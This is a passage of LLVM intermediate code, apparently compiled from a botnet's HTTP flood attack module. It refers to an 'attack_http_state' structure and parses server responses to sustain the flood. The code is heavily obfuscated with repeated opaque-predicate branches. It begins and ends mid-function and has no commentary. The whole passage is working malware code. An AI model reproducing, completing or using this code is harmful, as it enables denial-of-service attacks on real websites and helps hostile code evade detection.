  %2043 = sub nsw i32 %2041, %2042
  %2044 = call i32 @util_memsearch(i8* %2040, i32 %2043, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2044, i32* %53, align 4
  %2045 = load i32, i32* %53, align 4
  %2046 = icmp ne i32 %2045, -1
  %2047 = load i32, i32* @x.17
  %2048 = load i32, i32* @y.18
  %2049 = sub i32 %2047, 1
  %2050 = mul i32 %2047, %2049
  %2051 = urem i32 %2050, 2
  %2052 = icmp eq i32 %2051, 0
  %2053 = icmp slt i32 %2048, 10
  %2054 = or i1 %2052, %2053
  br i1 %2054, label %originalBBpart2418, label %originalBB413alteredBB

originalBBpart2418:                               ; preds = %originalBB413
  br i1 %2046, label %2055, label %2074

; <label>:2055:                                   ; preds = %originalBBpart2418
  %2056 = load i32, i32* %52, align 4
  %2057 = sext i32 %2056 to i64
  %2058 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2057
  store i8* %2058, i8** %54, align 8
  %2059 = load i32, i32* %53, align 4
  %2060 = icmp sge i32 %2059, 2
  br i1 %2060, label %2061, label %2064

; <label>:2061:                                   ; preds = %2055
  %2062 = load i32, i32* %53, align 4
  %2063 = sub nsw i32 %2062, 2
  store i32 %2063, i32* %53, align 4
  br label %2064

; <label>:2064:                                   ; preds = %2061, %2055
  %2065 = load i32, i32* %52, align 4
  %2066 = load i32, i32* %53, align 4
  %2067 = add nsw i32 %2065, %2066
  %2068 = sext i32 %2067 to i64
  %2069 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2068
  store i8 0, i8* %2069, align 1
  %2070 = load i8*, i8** %54, align 8
  %2071 = call i32 @util_atoi(i8* %2070, i32 10)
  %2072 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2073 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2072, i32 0, i32 14
  store i32 %2071, i32* %2073, align 4
  br label %2074

; <label>:2074:                                   ; preds = %2064, %originalBBpart2418
  br label %2078

; <label>:2075:                                   ; preds = %2008
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 14
  store i32 0, i32* %2077, align 4
  br label %2078

; <label>:2078:                                   ; preds = %2075, %2074
  store i32 0, i32* %45, align 4
  br label %2079

; <label>:2079:                                   ; preds = %2414, %2078
  %2080 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2081 = load i32, i32* %45, align 4
  %2082 = sext i32 %2081 to i64
  %2083 = getelementptr inbounds i8, i8* %2080, i64 %2082
  %2084 = load i32, i32* %20, align 4
  %2085 = call i8* @table_retrieve_val(i32 46, i32* null)
  %2086 = call i32 @util_stristr(i8* %2083, i32 %2084, i8* %2085)
  %2087 = icmp ne i32 %2086, -1
  br i1 %2087, label %2088, label %2093

; <label>:2088:                                   ; preds = %2079
  %2089 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2090 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2089, i32 0, i32 15
  %2091 = load i32, i32* %2090, align 4
  %2092 = icmp slt i32 %2091, 5
  br label %2093

; <label>:2093:                                   ; preds = %2088, %2079
  %2094 = phi i1 [ false, %2079 ], [ %2092, %2088 ]
  br i1 %2094, label %2095, label %2418

; <label>:2095:                                   ; preds = %2093
  %2096 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2097 = load i32, i32* %45, align 4
  %2098 = sext i32 %2097 to i64
  %2099 = getelementptr inbounds i8, i8* %2096, i64 %2098
  %2100 = load i32, i32* %20, align 4
  %2101 = call i8* @table_retrieve_val(i32 46, i32* null)
  %2102 = call i32 @util_stristr(i8* %2099, i32 %2100, i8* %2101)
  store i32 %2102, i32* %55, align 4
  %2103 = load i32, i32* %45, align 4
  %2104 = load i32, i32* %55, align 4
  %2105 = add nsw i32 %2103, %2104
  %2106 = sext i32 %2105 to i64
  %2107 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2106
  %2108 = load i8, i8* %2107, align 1
  %2109 = sext i8 %2108 to i32
  %2110 = icmp eq i32 %2109, 32
  br i1 %2110, label %2111, label %2114

; <label>:2111:                                   ; preds = %2095
  %2112 = load i32, i32* %55, align 4
  %2113 = add nsw i32 %2112, 1
  store i32 %2113, i32* %55, align 4
  br label %2114

; <label>:2114:                                   ; preds = %2111, %2095
  %2115 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2116 = load i32, i32* %45, align 4
  %2117 = sext i32 %2116 to i64
  %2118 = getelementptr inbounds i8, i8* %2115, i64 %2117
  %2119 = load i32, i32* %55, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds i8, i8* %2118, i64 %2120
  %2122 = load i32, i32* %20, align 4
  %2123 = load i32, i32* %45, align 4
  %2124 = sub nsw i32 %2122, %2123
  %2125 = load i32, i32* %55, align 4
  %2126 = sub nsw i32 %2124, %2125
  %2127 = call i32 @util_memsearch(i8* %2121, i32 %2126, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2127, i32* %56, align 4
  %2128 = load i32, i32* %56, align 4
  %2129 = icmp ne i32 %2128, -1
  br i1 %2129, label %2130, label %2414

; <label>:2130:                                   ; preds = %2114
  %2131 = load i32, i32* %45, align 4
  %2132 = load i32, i32* %55, align 4
  %2133 = add nsw i32 %2131, %2132
  %2134 = sext i32 %2133 to i64
  %2135 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2134
  store i8* %2135, i8** %57, align 8
  %2136 = load i32, i32* %56, align 4
  %2137 = icmp sge i32 %2136, 2
  br i1 %2137, label %2138, label %2141

; <label>:2138:                                   ; preds = %2130
  %2139 = load i32, i32* %56, align 4
  %2140 = sub nsw i32 %2139, 2
  store i32 %2140, i32* %56, align 4
  br label %2141

; <label>:2141:                                   ; preds = %2138, %2130
  %2142 = load i32, i32* @x.17
  %2143 = load i32, i32* @y.18
  %2144 = sub i32 %2142, 1
  %2145 = mul i32 %2142, %2144
  %2146 = urem i32 %2145, 2
  %2147 = icmp eq i32 %2146, 0
  %2148 = icmp slt i32 %2143, 10
  %2149 = or i1 %2147, %2148
  br i1 %2149, label %originalBB420, label %originalBB420alteredBB

originalBB420:                                    ; preds = %originalBB420alteredBB, %2141
  %2150 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2151 = load i32, i32* %45, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds i8, i8* %2150, i64 %2152
  %2154 = load i32, i32* %55, align 4
  %2155 = sext i32 %2154 to i64
  %2156 = getelementptr inbounds i8, i8* %2153, i64 %2155
  %2157 = load i32, i32* %20, align 4
  %2158 = load i32, i32* %45, align 4
  %2159 = sub nsw i32 %2157, %2158
  %2160 = load i32, i32* %55, align 4
  %2161 = sub nsw i32 %2159, %2160
  %2162 = call i32 @util_memsearch(i8* %2156, i32 %2161, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2163 = icmp sgt i32 %2162, 0
  %2164 = load i32, i32* @x.17
  %2165 = load i32, i32* @y.18
  %2166 = sub i32 %2164, 1
  %2167 = mul i32 %2164, %2166
  %2168 = urem i32 %2167, 2
  %2169 = icmp eq i32 %2168, 0
  %2170 = icmp slt i32 %2165, 10
  %2171 = or i1 %2169, %2170
  br i1 %2171, label %originalBBpart2432, label %originalBB420alteredBB

originalBBpart2432:                               ; preds = %originalBB420
  br i1 %2163, label %2172, label %2203

; <label>:2172:                                   ; preds = %originalBBpart2432
  %2173 = load i32, i32* @x.17
  %2174 = load i32, i32* @y.18
  %2175 = sub i32 %2173, 1
  %2176 = mul i32 %2173, %2175
  %2177 = urem i32 %2176, 2
  %2178 = icmp eq i32 %2177, 0
  %2179 = icmp slt i32 %2174, 10
  %2180 = or i1 %2178, %2179
  br i1 %2180, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %2172
  %2181 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2182 = load i32, i32* %45, align 4
  %2183 = sext i32 %2182 to i64
  %2184 = getelementptr inbounds i8, i8* %2181, i64 %2183
  %2185 = load i32, i32* %55, align 4
  %2186 = sext i32 %2185 to i64
  %2187 = getelementptr inbounds i8, i8* %2184, i64 %2186
  %2188 = load i32, i32* %20, align 4
  %2189 = load i32, i32* %45, align 4
  %2190 = sub nsw i32 %2188, %2189
  %2191 = load i32, i32* %55, align 4
  %2192 = sub nsw i32 %2190, %2191
  %2193 = call i32 @util_memsearch(i8* %2187, i32 %2192, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2194 = sub nsw i32 %2193, 1
  store i32 %2194, i32* %56, align 4
  %2195 = load i32, i32* @x.17
  %2196 = load i32, i32* @y.18
  %2197 = sub i32 %2195, 1
  %2198 = mul i32 %2195, %2197
  %2199 = urem i32 %2198, 2
  %2200 = icmp eq i32 %2199, 0
  %2201 = icmp slt i32 %2196, 10
  %2202 = or i1 %2200, %2201
  br i1 %2202, label %originalBBpart2462, label %originalBB434alteredBB

originalBBpart2462:                               ; preds = %originalBB434
  br label %2203

; <label>:2203:                                   ; preds = %originalBBpart2462, %originalBBpart2432
  %2204 = load i32, i32* %45, align 4
  %2205 = load i32, i32* %55, align 4
  %2206 = add nsw i32 %2204, %2205
  %2207 = load i32, i32* %56, align 4
  %2208 = add nsw i32 %2206, %2207
  %2209 = sext i32 %2208 to i64
  %2210 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2209
  store i8 0, i8* %2210, align 1
  store i32 0, i32* %18, align 4
  br label %2211

; <label>:2211:                                   ; preds = %originalBBpart2478, %2203
  %2212 = load i32, i32* @x.17
  %2213 = load i32, i32* @y.18
  %2214 = sub i32 %2212, 1
  %2215 = mul i32 %2212, %2214
  %2216 = urem i32 %2215, 2
  %2217 = icmp eq i32 %2216, 0
  %2218 = icmp slt i32 %2213, 10
  %2219 = or i1 %2217, %2218
  br i1 %2219, label %originalBB464, label %originalBB464alteredBB

originalBB464:                                    ; preds = %originalBB464alteredBB, %2211
  %2220 = load i32, i32* %18, align 4
  %2221 = load i8*, i8** %57, align 8
  %2222 = call i32 @util_strlen(i8* %2221)
  %2223 = icmp slt i32 %2220, %2222
  %2224 = load i32, i32* @x.17
  %2225 = load i32, i32* @y.18
  %2226 = sub i32 %2224, 1
  %2227 = mul i32 %2224, %2226
  %2228 = urem i32 %2227, 2
  %2229 = icmp eq i32 %2228, 0
  %2230 = icmp slt i32 %2225, 10
  %2231 = or i1 %2229, %2230
  br i1 %2231, label %originalBBpart2466, label %originalBB464alteredBB

originalBBpart2466:                               ; preds = %originalBB464
  br i1 %2223, label %2232, label %2277

; <label>:2232:                                   ; preds = %originalBBpart2466
  %2233 = load i8*, i8** %57, align 8
  %2234 = load i32, i32* %18, align 4
  %2235 = sext i32 %2234 to i64
  %2236 = getelementptr inbounds i8, i8* %2233, i64 %2235
  %2237 = load i8, i8* %2236, align 1
  %2238 = sext i8 %2237 to i32
  %2239 = icmp eq i32 %2238, 61
  br i1 %2239, label %2240, label %2241

; <label>:2240:                                   ; preds = %2232
  br label %2277

; <label>:2241:                                   ; preds = %2232
  %2242 = load i32, i32* @x.17
  %2243 = load i32, i32* @y.18
  %2244 = sub i32 %2242, 1
  %2245 = mul i32 %2242, %2244
  %2246 = urem i32 %2245, 2
  %2247 = icmp eq i32 %2246, 0
  %2248 = icmp slt i32 %2243, 10
  %2249 = or i1 %2247, %2248
  br i1 %2249, label %originalBB468, label %originalBB468alteredBB

originalBB468:                                    ; preds = %originalBB468alteredBB, %2241
  %2250 = load i32, i32* @x.17
  %2251 = load i32, i32* @y.18
  %2252 = sub i32 %2250, 1
  %2253 = mul i32 %2250, %2252
  %2254 = urem i32 %2253, 2
  %2255 = icmp eq i32 %2254, 0
  %2256 = icmp slt i32 %2251, 10
  %2257 = or i1 %2255, %2256
  br i1 %2257, label %originalBBpart2470, label %originalBB468alteredBB

originalBBpart2470:                               ; preds = %originalBB468
  br label %2258

; <label>:2258:                                   ; preds = %originalBBpart2470
  %2259 = load i32, i32* @x.17
  %2260 = load i32, i32* @y.18
  %2261 = sub i32 %2259, 1
  %2262 = mul i32 %2259, %2261
  %2263 = urem i32 %2262, 2
  %2264 = icmp eq i32 %2263, 0
  %2265 = icmp slt i32 %2260, 10
  %2266 = or i1 %2264, %2265
  br i1 %2266, label %originalBB472, label %originalBB472alteredBB

originalBB472:                                    ; preds = %originalBB472alteredBB, %2258
  %2267 = load i32, i32* %18, align 4
  %2268 = add nsw i32 %2267, 1
  store i32 %2268, i32* %18, align 4
  %2269 = load i32, i32* @x.17
  %2270 = load i32, i32* @y.18
  %2271 = sub i32 %2269, 1
  %2272 = mul i32 %2269, %2271
  %2273 = urem i32 %2272, 2
  %2274 = icmp eq i32 %2273, 0
  %2275 = icmp slt i32 %2270, 10
  %2276 = or i1 %2274, %2275
  br i1 %2276, label %originalBBpart2478, label %originalBB472alteredBB

originalBBpart2478:                               ; preds = %originalBB472
  br label %2211

; <label>:2277:                                   ; preds = %2240, %originalBBpart2466
  %2278 = load i8*, i8** %57, align 8
  %2279 = load i32, i32* %18, align 4
  %2280 = sext i32 %2279 to i64
  %2281 = getelementptr inbounds i8, i8* %2278, i64 %2280
  %2282 = load i8, i8* %2281, align 1
  %2283 = sext i8 %2282 to i32
  %2284 = icmp eq i32 %2283, 61
  br i1 %2284, label %2285, label %2413

; <label>:2285:                                   ; preds = %2277
  %2286 = load i32, i32* @x.17
  %2287 = load i32, i32* @y.18
  %2288 = sub i32 %2286, 1
  %2289 = mul i32 %2286, %2288
  %2290 = urem i32 %2289, 2
  %2291 = icmp eq i32 %2290, 0
  %2292 = icmp slt i32 %2287, 10
  %2293 = or i1 %2291, %2292
  br i1 %2293, label %originalBB480, label %originalBB480alteredBB

originalBB480:                                    ; preds = %originalBB480alteredBB, %2285
  %2294 = load i32, i32* %18, align 4
  store i32 %2294, i32* %58, align 4
  store i32 0, i32* %59, align 4
  store i32 0, i32* %18, align 4
  %2295 = load i32, i32* @x.17
  %2296 = load i32, i32* @y.18
  %2297 = sub i32 %2295, 1
  %2298 = mul i32 %2295, %2297
  %2299 = urem i32 %2298, 2
  %2300 = icmp eq i32 %2299, 0
  %2301 = icmp slt i32 %2296, 10
  %2302 = or i1 %2300, %2301
  br i1 %2302, label %originalBBpart2482, label %originalBB480alteredBB

originalBBpart2482:                               ; preds = %originalBB480
  br label %2303

; <label>:2303:                                   ; preds = %originalBBpart2496, %originalBBpart2482
  %2304 = load i32, i32* %18, align 4
  %2305 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2305, i32 0, i32 15
  %2307 = load i32, i32* %2306, align 4
  %2308 = icmp slt i32 %2304, %2307
  br i1 %2308, label %2309, label %2357

; <label>:2309:                                   ; preds = %2303
  %2310 = load i8*, i8** %57, align 8
  %2311 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2311, i32 0, i32 16
  %2313 = load i32, i32* %18, align 4
  %2314 = sext i32 %2313 to i64
  %2315 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2312, i64 0, i64 %2314
  %2316 = getelementptr inbounds [128 x i8], [128 x i8]* %2315, i32 0, i32 0
  %2317 = load i32, i32* %58, align 4
  %2318 = call signext i8 @util_strncmp(i8* %2310, i8* %2316, i32 %2317)
  %2319 = icmp ne i8 %2318, 0
  br i1 %2319, label %2320, label %2321

; <label>:2320:                                   ; preds = %2309
  store i32 1, i32* %59, align 4
  br label %2357

; <label>:2321:                                   ; preds = %2309
  %2322 = load i32, i32* @x.17
  %2323 = load i32, i32* @y.18
  %2324 = sub i32 %2322, 1
  %2325 = mul i32 %2322, %2324
  %2326 = urem i32 %2325, 2
  %2327 = icmp eq i32 %2326, 0
  %2328 = icmp slt i32 %2323, 10
  %2329 = or i1 %2327, %2328
  br i1 %2329, label %originalBB484, label %originalBB484alteredBB

originalBB484:                                    ; preds = %originalBB484alteredBB, %2321
  %2330 = load i32, i32* @x.17
  %2331 = load i32, i32* @y.18
  %2332 = sub i32 %2330, 1
  %2333 = mul i32 %2330, %2332
  %2334 = urem i32 %2333, 2
  %2335 = icmp eq i32 %2334, 0
  %2336 = icmp slt i32 %2331, 10
  %2337 = or i1 %2335, %2336
  br i1 %2337, label %originalBBpart2486, label %originalBB484alteredBB

originalBBpart2486:                               ; preds = %originalBB484
  br label %2338

; <label>:2338:                                   ; preds = %originalBBpart2486
  %2339 = load i32, i32* @x.17
  %2340 = load i32, i32* @y.18
  %2341 = sub i32 %2339, 1
  %2342 = mul i32 %2339, %2341
  %2343 = urem i32 %2342, 2
  %2344 = icmp eq i32 %2343, 0
  %2345 = icmp slt i32 %2340, 10
  %2346 = or i1 %2344, %2345
  br i1 %2346, label %originalBB488, label %originalBB488alteredBB

originalBB488:                                    ; preds = %originalBB488alteredBB, %2338
  %2347 = load i32, i32* %18, align 4
  %2348 = add nsw i32 %2347, 1
  store i32 %2348, i32* %18, align 4
  %2349 = load i32, i32* @x.17
  %2350 = load i32, i32* @y.18
  %2351 = sub i32 %2349, 1
  %2352 = mul i32 %2349, %2351
  %2353 = urem i32 %2352, 2
  %2354 = icmp eq i32 %2353, 0
  %2355 = icmp slt i32 %2350, 10
  %2356 = or i1 %2354, %2355
  br i1 %2356, label %originalBBpart2496, label %originalBB488alteredBB

originalBBpart2496:                               ; preds = %originalBB488
  br label %2303

; <label>:2357:                                   ; preds = %2320, %2303
  %2358 = load i32, i32* %59, align 4
  %2359 = icmp ne i32 %2358, 0
  br i1 %2359, label %2412, label %2360

; <label>:2360:                                   ; preds = %2357
  %2361 = load i8*, i8** %57, align 8
  %2362 = call i32 @util_strlen(i8* %2361)
  %2363 = icmp slt i32 %2362, 128
  br i1 %2363, label %2364, label %2395

; <label>:2364:                                   ; preds = %2360
  %2365 = load i32, i32* @x.17
  %2366 = load i32, i32* @y.18
  %2367 = sub i32 %2365, 1
  %2368 = mul i32 %2365, %2367
  %2369 = urem i32 %2368, 2
  %2370 = icmp eq i32 %2369, 0
  %2371 = icmp slt i32 %2366, 10
  %2372 = or i1 %2370, %2371
  br i1 %2372, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %2364
  %2373 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2373, i32 0, i32 16
  %2375 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2375, i32 0, i32 15
  %2377 = load i32, i32* %2376, align 4
  %2378 = sext i32 %2377 to i64
  %2379 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2374, i64 0, i64 %2378
  %2380 = getelementptr inbounds [128 x i8], [128 x i8]* %2379, i32 0, i32 0
  %2381 = load i8*, i8** %57, align 8
  %2382 = call i32 @util_strcpy(i8* %2380, i8* %2381)
  %2383 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2383, i32 0, i32 15
  %2385 = load i32, i32* %2384, align 4
  %2386 = add nsw i32 %2385, 1
  store i32 %2386, i32* %2384, align 4
  %2387 = load i32, i32* @x.17
  %2388 = load i32, i32* @y.18
  %2389 = sub i32 %2387, 1
  %2390 = mul i32 %2387, %2389
  %2391 = urem i32 %2390, 2
  %2392 = icmp eq i32 %2391, 0
  %2393 = icmp slt i32 %2388, 10
  %2394 = or i1 %2392, %2393
  br i1 %2394, label %originalBBpart2501, label %originalBB498alteredBB

originalBBpart2501:                               ; preds = %originalBB498
  br label %2395

; <label>:2395:                                   ; preds = %originalBBpart2501, %2360
  %2396 = load i32, i32* @x.17
  %2397 = load i32, i32* @y.18
  %2398 = sub i32 %2396, 1
  %2399 = mul i32 %2396, %2398
  %2400 = urem i32 %2399, 2
  %2401 = icmp eq i32 %2400, 0
  %2402 = icmp slt i32 %2397, 10
  %2403 = or i1 %2401, %2402
  br i1 %2403, label %originalBB503, label %originalBB503alteredBB

originalBB503:                                    ; preds = %originalBB503alteredBB, %2395
  %2404 = load i32, i32* @x.17
  %2405 = load i32, i32* @y.18
  %2406 = sub i32 %2404, 1
  %2407 = mul i32 %2404, %2406
  %2408 = urem i32 %2407, 2
  %2409 = icmp eq i32 %2408, 0
  %2410 = icmp slt i32 %2405, 10
  %2411 = or i1 %2409, %2410
  br i1 %2411, label %originalBBpart2505, label %originalBB503alteredBB

originalBBpart2505:                               ; preds = %originalBB503
  br label %2412

; <label>:2412:                                   ; preds = %originalBBpart2505, %2357
  br label %2413

; <label>:2413:                                   ; preds = %2412, %2277
  br label %2414

; <label>:2414:                                   ; preds = %2413, %2114
  %2415 = load i32, i32* %55, align 4
  %2416 = load i32, i32* %45, align 4
  %2417 = add nsw i32 %2416, %2415
  store i32 %2417, i32* %45, align 4
  br label %2079

; <label>:2418:                                   ; preds = %2093
  %2419 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2420 = load i32, i32* %20, align 4
  %2421 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2422 = call i32 @util_stristr(i8* %2419, i32 %2420, i8* %2421)
  %2423 = icmp ne i32 %2422, -1
  br i1 %2423, label %2424, label %2731

; <label>:2424:                                   ; preds = %2418
  %2425 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2426 = load i32, i32* %20, align 4
  %2427 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2428 = call i32 @util_stristr(i8* %2425, i32 %2426, i8* %2427)
  store i32 %2428, i32* %60, align 4
  %2429 = load i32, i32* %60, align 4
  %2430 = sext i32 %2429 to i64
  %2431 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2430
  %2432 = load i8, i8* %2431, align 1
  %2433 = sext i8 %2432 to i32
  %2434 = icmp eq i32 %2433, 32
  br i1 %2434, label %2435, label %2454

; <label>:2435:                                   ; preds = %2424
  %2436 = load i32, i32* @x.17
  %2437 = load i32, i32* @y.18
  %2438 = sub i32 %2436, 1
  %2439 = mul i32 %2436, %2438
  %2440 = urem i32 %2439, 2
  %2441 = icmp eq i32 %2440, 0
  %2442 = icmp slt i32 %2437, 10
  %2443 = or i1 %2441, %2442
  br i1 %2443, label %originalBB507, label %originalBB507alteredBB

originalBB507:                                    ; preds = %originalBB507alteredBB, %2435
  %2444 = load i32, i32* %60, align 4
  %2445 = add nsw i32 %2444, 1
  store i32 %2445, i32* %60, align 4
  %2446 = load i32, i32* @x.17
  %2447 = load i32, i32* @y.18
  %2448 = sub i32 %2446, 1
  %2449 = mul i32 %2446, %2448
  %2450 = urem i32 %2449, 2
  %2451 = icmp eq i32 %2450, 0
  %2452 = icmp slt i32 %2447, 10
  %2453 = or i1 %2451, %2452
  br i1 %2453, label %originalBBpart2514, label %originalBB507alteredBB

originalBBpart2514:                               ; preds = %originalBB507
  br label %2454

; <label>:2454:                                   ; preds = %originalBBpart2514, %2424
  %2455 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2456 = load i32, i32* %60, align 4
  %2457 = sext i32 %2456 to i64
  %2458 = getelementptr inbounds i8, i8* %2455, i64 %2457
  %2459 = load i32, i32* %20, align 4
  %2460 = load i32, i32* %60, align 4
  %2461 = sub nsw i32 %2459, %2460
  %2462 = call i32 @util_memsearch(i8* %2458, i32 %2461, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2462, i32* %61, align 4
  %2463 = load i32, i32* %61, align 4
  %2464 = icmp ne i32 %2463, -1
  br i1 %2464, label %2465, label %2730

; <label>:2465:                                   ; preds = %2454
  %2466 = load i32, i32* %60, align 4
  %2467 = sext i32 %2466 to i64
  %2468 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2467
  store i8* %2468, i8** %62, align 8
  %2469 = load i32, i32* %61, align 4
  %2470 = icmp sge i32 %2469, 2
  br i1 %2470, label %2471, label %2474

; <label>:2471:                                   ; preds = %2465
  %2472 = load i32, i32* %61, align 4
  %2473 = sub nsw i32 %2472, 2
  store i32 %2473, i32* %61, align 4
  br label %2474

; <label>:2474:                                   ; preds = %2471, %2465
  %2475 = load i32, i32* %60, align 4
  %2476 = load i32, i32* %61, align 4
  %2477 = add nsw i32 %2475, %2476
  %2478 = sext i32 %2477 to i64
  %2479 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2478
  store i8 0, i8* %2479, align 1
  %2480 = load i32, i32* %61, align 4
  %2481 = add nsw i32 %2480, 1
  store i32 %2481, i32* %61, align 4
  %2482 = load i8*, i8** %62, align 8
  %2483 = load i32, i32* %61, align 4
  %2484 = call i32 @util_memsearch(i8* %2482, i32 %2483, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2485 = icmp eq i32 %2484, 4
  br i1 %2485, label %2486, label %2640

; <label>:2486:                                   ; preds = %2474
  store i32 7, i32* %18, align 4
  %2487 = load i8*, i8** %62, align 8
  %2488 = getelementptr inbounds i8, i8* %2487, i64 4
  %2489 = load i8, i8* %2488, align 1
  %2490 = sext i8 %2489 to i32
  %2491 = icmp eq i32 %2490, 115
  br i1 %2491, label %2492, label %2511

; <label>:2492:                                   ; preds = %2486
  %2493 = load i32, i32* @x.17
  %2494 = load i32, i32* @y.18
  %2495 = sub i32 %2493, 1
  %2496 = mul i32 %2493, %2495
  %2497 = urem i32 %2496, 2
  %2498 = icmp eq i32 %2497, 0
  %2499 = icmp slt i32 %2494, 10
  %2500 = or i1 %2498, %2499
  br i1 %2500, label %originalBB516, label %originalBB516alteredBB

originalBB516:                                    ; preds = %originalBB516alteredBB, %2492
  %2501 = load i32, i32* %18, align 4
  %2502 = add nsw i32 %2501, 1
  store i32 %2502, i32* %18, align 4
  %2503 = load i32, i32* @x.17
  %2504 = load i32, i32* @y.18
  %2505 = sub i32 %2503, 1
  %2506 = mul i32 %2503, %2505
  %2507 = urem i32 %2506, 2
  %2508 = icmp eq i32 %2507, 0
  %2509 = icmp slt i32 %2504, 10
  %2510 = or i1 %2508, %2509
  br i1 %2510, label %originalBBpart2529, label %originalBB516alteredBB

originalBBpart2529:                               ; preds = %originalBB516
  br label %2511

; <label>:2511:                                   ; preds = %originalBBpart2529, %2486
  %2512 = load i8*, i8** %62, align 8
  %2513 = load i8*, i8** %62, align 8
  %2514 = load i32, i32* %18, align 4
  %2515 = sext i32 %2514 to i64
  %2516 = getelementptr inbounds i8, i8* %2513, i64 %2515
  %2517 = load i32, i32* %61, align 4
  %2518 = load i32, i32* %18, align 4
  %2519 = sub nsw i32 %2517, %2518
  %2520 = sext i32 %2519 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2512, i8* %2516, i64 %2520, i32 1, i1 false)
  store i32 0, i32* %18, align 4
  br label %2521

; <label>:2521:                                   ; preds = %originalBBpart2544, %2511
  %2522 = load i8*, i8** %62, align 8
  %2523 = load i32, i32* %18, align 4
  %2524 = sext i32 %2523 to i64
  %2525 = getelementptr inbounds i8, i8* %2522, i64 %2524
  %2526 = load i8, i8* %2525, align 1
  %2527 = sext i8 %2526 to i32
  %2528 = icmp ne i32 %2527, 0
  br i1 %2528, label %2529, label %2577

; <label>:2529:                                   ; preds = %2521
  %2530 = load i32, i32* @x.17
  %2531 = load i32, i32* @y.18
  %2532 = sub i32 %2530, 1
  %2533 = mul i32 %2530, %2532
  %2534 = urem i32 %2533, 2
  %2535 = icmp eq i32 %2534, 0
  %2536 = icmp slt i32 %2531, 10
  %2537 = or i1 %2535, %2536
  br i1 %2537, label %originalBB531, label %originalBB531alteredBB

originalBB531:                                    ; preds = %originalBB531alteredBB, %2529
  %2538 = load i8*, i8** %62, align 8
  %2539 = load i32, i32* %18, align 4
  %2540 = sext i32 %2539 to i64
  %2541 = getelementptr inbounds i8, i8* %2538, i64 %2540
  %2542 = load i8, i8* %2541, align 1
  %2543 = sext i8 %2542 to i32
  %2544 = icmp eq i32 %2543, 47
  %2545 = load i32, i32* @x.17
  %2546 = load i32, i32* @y.18
  %2547 = sub i32 %2545, 1
  %2548 = mul i32 %2545, %2547
  %2549 = urem i32 %2548, 2
  %2550 = icmp eq i32 %2549, 0
  %2551 = icmp slt i32 %2546, 10
  %2552 = or i1 %2550, %2551
  br i1 %2552, label %originalBBpart2533, label %originalBB531alteredBB

originalBBpart2533:                               ; preds = %originalBB531
  br i1 %2544, label %2553, label %2558

; <label>:2553:                                   ; preds = %originalBBpart2533
  %2554 = load i8*, i8** %62, align 8
  %2555 = load i32, i32* %18, align 4
  %2556 = sext i32 %2555 to i64
  %2557 = getelementptr inbounds i8, i8* %2554, i64 %2556
  store i8 0, i8* %2557, align 1
  br label %2577

; <label>:2558:                                   ; preds = %originalBBpart2533
  %2559 = load i32, i32* @x.17
  %2560 = load i32, i32* @y.18
  %2561 = sub i32 %2559, 1
  %2562 = mul i32 %2559, %2561
  %2563 = urem i32 %2562, 2
  %2564 = icmp eq i32 %2563, 0
  %2565 = icmp slt i32 %2560, 10
